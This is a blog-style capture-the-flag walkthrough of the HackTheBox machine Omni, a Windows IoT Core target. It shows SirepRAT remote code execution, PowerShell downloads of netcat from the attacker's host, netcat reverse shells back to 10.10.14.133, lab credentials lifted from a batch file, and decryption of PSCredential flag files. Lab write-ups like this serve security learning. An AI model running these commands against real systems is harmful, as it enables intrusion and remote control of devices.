@@ -1,0 +1,346 @@
+---
+layout: walkthrough
+title: HackTheBox - Omni
+date: 2021-01-10 12:00:00 +0200
+img: ChallengeVMs/HTB_Icons/omni.png # Add image post (optional)
+status: Retired
+description: Hi all, My name is Kyhle Öhlinger and this post forms part of my challenge VM writeups. If you enjoy any of the posts, feel free to reach out and let me know :) 
+---
+
+Hi everyone, today we are going to be looking at Omni --`10.10.10.204`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/Overview.png"  style="width: 65%" />
+</p>
+
+## Information Gathering
+
+In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.
+
+### Nmap Output
+
+<details>
+
+```bat
+
+sudo nmap -sC -sV 10.10.10.204 -Pn
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 09:21 EDT
+Nmap scan report for omni.htb (10.10.10.204)
+Host is up (0.20s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE VERSION
+135/tcp  open  msrpc   Microsoft Windows RPC
+8080/tcp open  upnp    Microsoft IIS httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn't have a title.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.76 seconds
+
+Windows RPC - Higher level ports not shown in general nmap so doing another full nmap while looking at the identified ports.
+
+```
+
+</details>
+
+From the output shown above, we can see that the machine is a Windows machine based on the information provided from the `http-server-header`, and I added `omni.htb` to the `/etc/hosts` file. As this is a Windows machine and it only has 2 open ports, I'm going to assume that we need to start by looking at the web application. When browsing to <http://omni.htb:8080> we were presented with the following login form:
+
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img1.png"  style="width: 65%" />
+</p>
+
+There was not a lot to go on and since port 135 is RPC, I decided to focus my initial efforts on port 8080. From the Nmap scan, it also provides us with the following information: `Basic realm=Windows Device Portal`. A quick Google search produces the following link: <https://docs.microsoft.com/en-us/windows/uwp/debug-test-perf/device-portal>.
+
+> Windows Device Portal is a web server on your device that you can connect to from a web browser on a PC. If your device has a web browser, you can also connect locally with the browser on that device.
+
+If you scroll down to the first table, it shows which ports are generally open for the type of device. Since port 8080 is open on this machine, it seems likely that we are going to be exploiting an IoT device.
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img2.png"  style="width: 60%" />
+</p>
+
+
+Unfortunately default credentials do not work, but some more Google searching for IoT exploitation lead me to the following Github Page: <https://github.com/SafeBreach-Labs/SirepRAT>. 
+
+## Exploiting IoT with SirepRAT
+
+After looking through the [slides](https://github.com/SafeBreach-Labs/SirepRAT/blob/master/docs/SirepRAT_RCE_as_SYSTEM_on_Windows_IoT_Core_Slides.pdf), I came across the following:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img3.png"  style="width: 60%" />
+</p>
+
+In order for exploitation to work, all that we required was access to port 29820. Running another nmap, port 29820 was open on the machine! The output from the additional nmap scan is shown below:
+
+<details>
+
+```bat
+
+vagrant@ko:~/Desktop/HackTheBox/Omni/logs$ sudo nmap -sC -sV 10.10.10.204 -Pn -p-
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 09:23 EDT
+Nmap scan report for omni.htb (10.10.10.204)
+Host is up (0.19s latency).
+Not shown: 65529 filtered ports
+PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn't have a title.
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+29820/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port29820-TCP:V=7.80%I=7%D=9/22%Time=5F69FC42%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,"
+SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xfb`\x0
+SF:4G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\x
+SF:c9}\xc8O\x12");
+Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 464.09 seconds
+
+```
+
+</details>
+
+
+Okay, lets see if SirepRat is able to connect. Following the documentation on the Github page, in order to ensure that the tool is able to connect to the IoT device for exploitation, I initially attempted to retrieve the device's information. The command and output thereof is shown below:
+
+```python
+python2 SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
+```
+```
+<SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>
+```
+
+Okay awesome! Since I knew that I was able to interact with the IoT device, there are several options available for exploitation. My initial thought was to use the `Run Arbitrary Program` functionality within SirepRAT. The base command for this is shown below:
+
+```python
+python SirepRAT.py 192.168.3.17 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\hostname.exe"
+```
+
+### Uploading files using Run Arbitrary Program
+
+Even though I had Remote Code Execution (RCE), I was still limited in what was possible with SirepRAT. In order to exploit the machine, I wanted to get a reverse shell and one way to do this is through the use of netcat which I could try and get onto the machine through the use of PowerShell web requests. This method would allow me to upload different executables and obtain a proper foothold on the host. In order to upload netcat, I used the following command:
+
+```python
+python2 SirepRAT.py 10.10.10.204  LaunchCommandWithOutput --return_output --cmd  "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest  -OutFile C:\\Windows\\Temp\\nc64.exe -Uri  http://10.10.14.133/nc64.exe" --v
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img4.png"  style="width: 80%" />
+</p>
+
+Now that netcat was on the host, I could use the same method to use the netcat binary to connect back to my machine, the command is shown below:
+
+```python
+python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\Temp\\nc64.exe 10.10.14.133 1234 -e powershell.exe"
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img5.png"  style="width: 80%" />
+</p>
+
+
+### Lateral Movement using the Computer account
+
+As shown above, the reverse shell worked, however we were running as the system account (`omni$`) which the IoT device made use of. This meant that I was not able to run WinPEAS on the server as it would require execution from "userland". Even though I would have been able to just pull the SAM and SYSTEM registry entries to retrieve the user's passwords, I didn't think that that was the intended method for the machine. Instead, the first thing I like to do is look for hidden files. (Since Users was empty, let's look at data). The following commands can be used to find hidden files and folders:
+
+* `dir /a` should show hidden folders.
+* `dir /a:h` shows all hidden files.
+* `dir /a:h /s` shows all hidden files recursively.
+
+After enumerating the High-Level folders, I eventually came across `r.bat`. 
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img6.png"  style="width: 70%" />
+</p>
+
+The contents of the file are shown below:
+
+<details>
+
+```bat
+
+type WindowsPowerShell\Modules\PackageManagement\r.bat
+@echo off
+
+:LOOP
+
+for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete
+
+net user app mesh5143
+net user administrator _1nt3rn37ofTh1nGz
+
+ping -n 3 127.0.0.1
+
+cls
+
+GOTO :LOOP
+
+:EXIT
+
+```
+</details>
+
+The file contained 2 sets of credentials, one for `app` and one for `administrator`. My First thought was to use `runas` however the runas binary was not available to the computer account.
+
+```bat
+C:\Program Files>runas
+runas
+'runas' is not recognized as an internal or external command,
+operable program or batch file.
+```
+
+If you recall from the initial enumeration phase, port 8080 was still accessible to us, and now that I had use credentials, I attempted to log in to the application. 
+
+## Lateral Movement using App user
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img7.png"  style="width: 100%" />
+</p>
+
+Clicking around a bit led me to Processes &rarr; Run Command:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img8.png"  style="width: 60%" />
+</p>
+
+
+My initial thought was to simply use the `nc64.exe` binary that was already uploaded, however the `app` user didn't have read permissions to the directory. One directory that most users can read and write to is the `C:\Windows\System32\spool\drivers\color\` directory. In order use the binary, I first needed to upload the binary to the new location using SirepRAT as shown below:
+
+```python
+python2 SirepRAT.py 10.10.10.204  LaunchCommandWithOutput --return_output --cmd  "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest  -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri  http://10.10.14.133/nc64.exe" --v
+```
+
+Using the console on port 8080, I ran the following command:
+
+```bat
+C:\Windows\System32\cmd.exe /c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.133 1234 -e powershell.exe
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img9.png"  style="width: 70%" />
+</p>
+
+Even though the JavaScript box stated that the console failed to run the command, I still got a connection back, as shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img10.png"  style="width: 80%" />
+</p>
+
+### PSCredentials
+Once I was on the machine, I found `hardening.txt` within the `app` user's home directory. The contents of the file are shown below:
+
+```bat
+C:\Data\Users\app>type hardening.txt
+type hardening.txt
+- changed default administrator password of "p@ssw0rd"
+- added firewall rules to restrict unnecessary services
+- removed administrator account from "Ssh Users" group
+```
+
+This explained why we weren't able to access the administrator account with default credentials. The `user.txt` file was encrypted with PSCredential as shown below:
+
+
+<details>
+
+```bat
+C:\Data\Users\app>type user.txt
+type user.txt
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">flag</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+```
+
+</details>
+
+The following link describes how to decrypt the PowerShell Secure String password: <https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/>, the command that I used is shown below:
+
+```powershell
+$credential.GetNetworkCredential().password
+```
+
+In order to decrypt the password, I initially needed to import the XML file into a PowerShell variable. the following link describes the process: <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml?view=powershell-7>. The command that was used is shown below:
+
+```powershell
+$credential = Import-Clixml -Path .\user.txt
+```
+
+Using the same method on the iot-admin.xml file would have also provided us with the administrator password if the `r.bat` file was not retrieved initially.
+
+## Privilege Escalation using Administrator user
+
+This portion of the VM was the exact same method as with the `app` user. I used the credentials from the bat file and followed the same procedure. Since the netcat binary was already on the machine under the color drivers directory, I could simply use the exploitation command shown below:
+
+```bat
+C:\Windows\System32\cmd.exe /c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.133 1234 -e powershell.exe
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img11.png"  style="width: 70%" />
+</p>
+
+As with the `app` user, even though the JavaScript box stated that the console failed to run the command, I still got a connection back, as shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Omni/img12.png"  style="width: 80%" />
+</p>
+
+
+As with `user.txt`, the `root.txt` file was also encrypted with PowerShell Secure string as shown below:
+
+<details>
+
+```bat
+C:\Data\Users\administrator>type root.txt
+type root.txt
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">flag</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+```
+
+</details>
+
+In order to retrieve the plain text password, I needed to import the XML file and decrypt it using PowerShell. The commands I used are as follows:
+
+```powershell
+PS C:\Data\Users\administrator> $credential = Import-Clixml -Path .\root.txt
+
+PS C:\Data\Users\administrator> $credential.GetNetworkCredential().password
+5dbdce5569e2c4708617c0ce6e9bf11d
+```
+
+That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
